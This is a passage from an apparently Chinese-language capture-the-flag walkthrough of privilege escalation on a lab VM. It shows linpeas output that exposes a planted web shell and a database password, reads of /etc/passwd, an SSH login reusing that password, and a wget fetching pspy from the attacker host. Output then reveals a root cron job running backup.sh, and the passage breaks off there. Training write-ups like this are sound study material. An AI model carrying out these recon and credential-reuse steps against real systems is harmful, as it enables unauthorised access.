class="string">/var/www/html/academy/check_availability.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/db</span></span><br><span class="line"><span class="string">/var/www/html/academy/db/onlinecourse.sql</span></span><br><span class="line"><span class="string">/var/www/html/academy/enroll-history.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/enroll.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/config.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/footer.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/header.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/menubar.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/index.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/logout.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/my-profile.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/pincode-verification.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/print.php</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/shell.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                             </span></span><br><span class="line"><span class="string">  Group www-data:                                                                                                             </span></span><br><span class="line"><span class="string">/tmp/linpeas.sh                                                                                                               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            ╔═════════════════════════╗</span></span><br><span class="line"><span class="string">════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                           </span></span><br><span class="line"><span class="string">                            ╚═════════════════════════╝                                                                       </span></span><br><span class="line"><span class="string">╔══════════╣ .sh files in path</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                    </span></span><br><span class="line"><span class="string">/usr/bin/gettext.sh                                                                                                           </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Executable files potentially added by user (limit 70)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Unexpected in /opt (usually empty)</span></span><br><span class="line"><span class="string">total 11332                                                                                                                   </span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root     4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 18 root root     4096 May 29  2021 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  1402271 Jun  3  2020 online-course-registration.zip</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root 10190261 Oct 15  2020 phpMyAdmin-4.9.7-all-languages.tar.gz</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Unexpected in root</span></span><br><span class="line"><span class="string">/vmlinuz                                                                                                                      </span></span><br><span class="line"><span class="string">/initrd.img</span></span><br><span class="line"><span class="string">/initrd.img.old</span></span><br><span class="line"><span class="string">/vmlinuz.old</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Modified interesting files in the last 5mins (limit 100)</span></span><br><span class="line"><span class="string">/var/log/auth.log                                                                                                             </span></span><br><span class="line"><span class="string">/var/log/debug.1</span></span><br><span class="line"><span class="string">/var/log/daemon.log.1</span></span><br><span class="line"><span class="string">/var/log/daemon.log</span></span><br><span class="line"><span class="string">/var/log/syslog</span></span><br><span class="line"><span class="string">/var/log/messages.1</span></span><br><span class="line"><span class="string">/var/log/auth.log.1</span></span><br><span class="line"><span class="string">/var/log/syslog.1</span></span><br><span class="line"><span class="string">/var/log/kern.log.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Writable log files (logrotten) (limit 50)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation                                     </span></span><br><span class="line"><span class="string">logrotate 3.14.0                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Default mail command:       /usr/bin/mail</span></span><br><span class="line"><span class="string">    Default compress command:   /bin/gzip</span></span><br><span class="line"><span class="string">    Default uncompress command: /bin/gunzip</span></span><br><span class="line"><span class="string">    Default compress extension: .gz</span></span><br><span class="line"><span class="string">    Default state file path:    /var/lib/logrotate/status</span></span><br><span class="line"><span class="string">    ACL support:                yes</span></span><br><span class="line"><span class="string">    SELinux support:            yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Files inside /home/www-data (limit 20)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Files inside others home (limit 20)</span></span><br><span class="line"><span class="string">/home/grimmie/.bash_history                                                                                                   </span></span><br><span class="line"><span class="string">/home/grimmie/.bashrc</span></span><br><span class="line"><span class="string">/home/grimmie/backup.sh</span></span><br><span class="line"><span class="string">/home/grimmie/.profile</span></span><br><span class="line"><span class="string">/home/grimmie/.bash_logout</span></span><br><span class="line"><span class="string">/var/www/html/index.html</span></span><br><span class="line"><span class="string">/var/www/html/academy/logout.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/enroll.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/check_availability.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/my-profile.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/change-password.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/print.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/licensed-image.jpeg</span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/shell.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/avatar-1.jpg.png</span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/noimage.png</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/footer.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/header.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/config.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/menubar.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching installed mail applications</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Mails (limit 50)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Backup files (limited 100)</span></span><br><span class="line"><span class="string">-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                   </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 9716 Nov 28  2020 /usr/lib/modules/4.19.0-13-amd64/kernel/drivers/net/team/team_mode_activebackup.ko</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 9731 Mar 19  2021 /usr/lib/modules/4.19.0-16-amd64/kernel/drivers/net/team/team_mode_activebackup.ko</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 303 Oct 26  2018 /usr/share/doc/hdparm/changelog.old.gz</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes.old.gz</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 348 Nov 25  2020 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz</span></span><br><span class="line"><span class="string">-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Web files?(output limit)</span></span><br><span class="line"><span class="string">/var/www/:                                                                                                                    </span></span><br><span class="line"><span class="string">total 12K</span></span><br><span class="line"><span class="string">drwxr-xr-x  3 root root 4.0K May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 12 root root 4.0K May 29  2021 ..</span></span><br><span class="line"><span class="string">drwxr-xr-x  3 root root 4.0K May 29  2021 html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html:</span></span><br><span class="line"><span class="string">total 24K</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 root     root     4.0K May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 root     root     4.0K May 29  2021 ..</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 grimmie administrator 220 May 29  2021 /home/grimmie/.bash_logout                                                </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 0 Feb 15 11:15 /run/network/.ifstate.lock</span></span><br><span class="line"><span class="string">-rw------- 1 root root 0 May 29  2021 /etc/.pwd.lock</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                                       </span></span><br><span class="line"><span class="string">-rwxrwxrwx 1 www-data www-data 853290 Feb 15 14:03 /tmp/linpeas.sh                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching passwords in history files</span></span><br><span class="line"><span class="string">Binary file /usr/share/phpmyadmin/js/vendor/openlayers/theme/default/img/navigation_history.png matches                       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching passwords in config PHP files</span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/config.inc.php:$cfg[&#x27;</span>Servers<span class="string">&#x27;][$i][&#x27;</span>AllowNoPassword<span class="string">&#x27;] = false;                                          </span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/config.sample.inc.php:$cfg[&#x27;</span>Servers<span class="string">&#x27;][$i][&#x27;</span>AllowNoPassword<span class="string">&#x27;] = false;</span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/libraries/config.default.php:$cfg[&#x27;</span>Servers<span class="string">&#x27;][$i][&#x27;</span>AllowNoPassword<span class="string">&#x27;] = false;</span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/libraries/config.default.php:$cfg[&#x27;</span>ShowChgPassword<span class="string">&#x27;] = true;</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/config.php:$mysql_password = &quot;My_V3ryS3cur3_P4ss&quot;;</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/config.php:$mysql_password = &quot;My_V3ryS3cur3_P4ss&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching *password* or *credential* files in home (limit 70)</span></span><br><span class="line"><span class="string">/etc/pam.d/common-password                                                                                                    </span></span><br><span class="line"><span class="string">/usr/bin/systemd-ask-password</span></span><br><span class="line"><span class="string">/usr/bin/systemd-tty-ask-password-agent</span></span><br><span class="line"><span class="string">/usr/lib/grub/i386-pc/legacy_password_test.mod</span></span><br><span class="line"><span class="string">/usr/lib/grub/i386-pc/password.mod</span></span><br><span class="line"><span class="string">/usr/lib/grub/i386-pc/password_pbkdf2.mod</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/systemd-ask-password-console.path</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/systemd-ask-password-console.service</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/systemd-ask-password-wall.path</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/systemd-ask-password-wall.service</span></span><br><span class="line"><span class="string">  #)There are more creds/passwds files in the previous parent folder</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/usr/lib/x86_64-linux-gnu/mariadb19/plugin/mysql_clear_password.so</span></span><br><span class="line"><span class="string">/usr/lib/x86_64-linux-gnu/mariadb19/plugin/simple_password_check.so</span></span><br><span class="line"><span class="string">/usr/share/man/man1/systemd-ask-password.1.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man7/credentials.7.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man8/systemd-ask-password-console.path.8.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man8/systemd-ask-password-console.service.8.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man8/systemd-ask-password-wall.path.8.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man8/systemd-ask-password-wall.service.8.gz</span></span><br><span class="line"><span class="string">  #)There are more creds/passwds files in the previous parent folder</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/usr/share/pam/common-password.md5sums</span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/user_password.php</span></span><br><span class="line"><span class="string">/var/cache/debconf/passwords.dat</span></span><br><span class="line"><span class="string">/var/lib/pam/password</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/change-password.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/change-password.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Searching passwords inside logs (limit 70)</span></span><br><span class="line"><span class="string">2021-05-29 17:00:10 install base-passwd:amd64 &lt;none&gt; 3.5.46                                                                   </span></span><br><span class="line"><span class="string">2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:21 install passwd:amd64 &lt;none&gt; 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 &lt;none&gt;</span></span><br><span class="line"><span class="string">2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 &lt;none&gt;</span></span><br><span class="line"><span class="string">2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">Description: Set up users and passwords</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                ╔════════════════╗</span></span><br><span class="line"><span class="string">════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                            </span></span><br><span class="line"><span class="string">                                ╚════════════════╝                                                                            </span></span><br><span class="line"><span class="string">Regexes to search for API keys aren&#x27;</span>t activated, use param <span class="string">&#x27;-r&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通過這工具也找出了不少關於這系統的資訊，及資料庫密碼，更重要的是<strong>backup.sh似乎可以進行PE利用</strong></p>
</li>
<li><p>查看**&#x2F;var&#x2F;www&#x2F;html&#x2F;academy&#x2F;includes&#x2F;config.php檔案內容**</p>
</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> /var/www/html/academy/includes/config.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$mysql_hostname</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$mysql_user</span> = <span class="string">&quot;grimmie&quot;</span>;</span><br><span class="line"><span class="variable">$mysql_password</span> = <span class="string">&quot;My_V3ryS3cur3_P4ss&quot;</span>;</span><br><span class="line"><span class="variable">$mysql_database</span> = <span class="string">&quot;onlinecourse&quot;</span>;</span><br><span class="line"><span class="variable">$bd</span> = mysqli_connect(<span class="variable">$mysql_hostname</span>, <span class="variable">$mysql_user</span>, <span class="variable">$mysql_password</span>, <span class="variable">$mysql_database</span>) or die(<span class="string">&quot;Could not connect database&quot;</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">**grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash**</span><br></pre></td></tr></table></figure>
<ul>
<li>DB帳戶是grimmie，該用戶是管理員身分</li>
<li>嘗試SSH登入，將帳密輸入</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ssh grimmie@192.168.19.141                                                                               </span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.19.141 (192.168.19.141)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:eeNKTTakhvXyaWVPMDTB9+/4WEg6WKZwlUp0ATptgb0.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.19.141<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">grimmie@192.168.19.141&#x27;</span>s password: **My_V3ryS3cur3_P4ss**</span><br><span class="line">Linux academy 4.19.0-16-amd64 <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun May 30 03:21:39 2021 from 192.168.10.31</span><br><span class="line">grimmie@academy:~$</span><br><span class="line">grimmie@academy:~$ <span class="built_in">ls</span></span><br><span class="line">backup.sh</span><br><span class="line">grimmie@academy:~$ **<span class="built_in">cat</span> backup.sh**  <span class="comment">#periodic check 工作週期檢查，讓系統去執行一些固定時間要自動進行的例行性工作</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> /tmp/backup.zip</span><br><span class="line">zip -r /tmp/backup.zip /var/www/html/academy/includes</span><br><span class="line"><span class="built_in">chmod</span> 700 /tmp/backup.zip</span><br><span class="line"></span><br><span class="line">grimmie@academy:~$ **crontab -l** <span class="comment">#-l UserName	列出使用者的 crontab 檔案。</span></span><br><span class="line">no crontab <span class="keyword">for</span> grimmie  </span><br><span class="line">grimmie@academy:~$ **crontab -u root -l** <span class="comment">#列出使用者 Cron 工作的狀態。</span></span><br><span class="line">must be privileged to use -u <span class="comment">#目前沒sudo執行權限</span></span><br><span class="line">grimmie@academy:~$ **crontab -e** <span class="comment">#建立 crontab 並選擇預設編輯器</span></span><br><span class="line">no crontab <span class="keyword">for</span> grimmie - using an empty one</span><br><span class="line"></span><br><span class="line">Select an editor.  To change later, run <span class="string">&#x27;select-editor&#x27;</span>.</span><br><span class="line">  1. /bin/nano        &lt;---- easiest</span><br><span class="line">  2. /usr/bin/vim.tiny</span><br><span class="line"></span><br><span class="line">Choose 1-2 [1]: 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  <img src="/img/privilege_Untitled_11.png" alt="Untitled"></p>
<ul>
<li>列出計時器，查看是否有腳本正在運行計時器</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grimmie@academy:~$ **systemctl list-timers** </span><br><span class="line">NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES</span><br><span class="line">Thu 2024-02-15 15:39:00 EST  24min left Thu 2024-02-15 15:09:01 EST  5min ago     phpsessionclean.timer        phpsessionclean.service</span><br><span class="line">Fri 2024-02-16 00:00:00 EST  8h left    n/a                          n/a          logrotate.timer              logrotate.service</span><br><span class="line">Fri 2024-02-16 00:00:00 EST  8h left    n/a                          n/a          man-db.timer                 man-db.service</span><br><span class="line">Fri 2024-02-16 05:17:18 EST  14h left   n/a                          n/a          apt-daily.timer              apt-daily.service</span><br><span class="line">Fri 2024-02-16 06:58:25 EST  15h left   n/a                          n/a          apt-daily-upgrade.timer      apt-daily-upgrade.service</span><br><span class="line">Fri 2024-02-16 11:30:17 EST  20h left   Thu 2024-02-15 11:30:17 EST  3h 44min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service</span><br><span class="line"></span><br><span class="line">6 timers listed.</span><br><span class="line">Pass --all to see loaded but inactive timers, too.</span><br><span class="line"></span><br><span class="line">grimmie@academy:~$ ps <span class="comment">#前運行的進程</span></span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">29894 pts/0    00:00:00 bash</span><br><span class="line">30189 pts/0    00:00:00 ps <span class="comment">#顯示當前運行的進程信息</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>驗證和確認腳本是<strong>在計時器上運行</strong>，使用PSPY <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
</li>
<li><p>記得將這腳本放到遠程傳送的目錄下，也就是開啟了http.server的目錄位置</p>
<ul>
<li>testscript&#x2F;trans</li>
<li>下載腳本到grimmie的用戶下</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grimmie@academy:/tmp$ wget http://192.168.19.130/pspy64</span><br><span class="line">--2024-02-15 15:26:04--  http://192.168.19.130/pspy64</span><br><span class="line">Connecting to 192.168.19.130:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3104768 (3.0M) [application/octet-stream]</span><br><span class="line">Saving to: ‘pspy64’</span><br><span class="line"></span><br><span class="line">pspy64                               100%[===================================================================&gt;]   2.96M  --.-KB/s    <span class="keyword">in</span> 0.09s   </span><br><span class="line"></span><br><span class="line">2024-02-15 15:26:04 (31.5 MB/s) - ‘pspy64’ saved [3104768/3104768]</span><br></pre></td></tr></table></figure>
<ul>
<li>現在用工具確認backup.sh正在運行</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grimmie@academy:/tmp$ **./pspy64** </span><br><span class="line">pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d</span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ </span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ </span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=<span class="literal">true</span>): processes=<span class="literal">true</span> | file-system-events=<span class="literal">false</span> ||| Scanning <span class="keyword">for</span> processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">2024/02/15 15:26:54 CMD: UID=1000  PID=30261  | ./pspy64 </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=29932  | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=1000  PID=29894  | -bash </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=1000  PID=29893  | sshd: grimmie@pts/0  </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=1000  PID=29885  | (sd-pam) </span><br><span class="line">.........</span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=9      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=8      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=6      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=4      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=3      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=2      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=1      | /sbin/init </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30268  | /usr/sbin/CRON -f </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30269  | /usr/sbin/CRON -f </span><br><span class="line">**2024/02/15 15:27:01 CMD: UID=0     PID=30270  | /bin/sh -c /home/grimmie/backup.sh </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30271  | /bin/bash /home/grimmie/backup.sh </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30272  | /bin/bash /home/grimmie/backup.sh </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     